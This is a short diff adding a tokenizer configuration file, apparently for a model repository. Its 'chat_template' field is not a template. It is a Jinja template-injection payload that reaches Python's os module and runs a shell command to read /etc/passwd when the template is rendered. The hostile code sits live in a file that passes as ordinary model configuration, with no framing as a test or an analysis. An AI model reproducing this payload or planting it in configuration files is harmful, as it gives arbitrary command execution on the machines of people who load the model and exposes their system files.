@@ -1,0 +1,5 @@
+{
+  "tokenizer_class": "RobertaTokenizer",
+  "chat_template": "{{ cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }}",
+  "model_max_length": 1024
+}
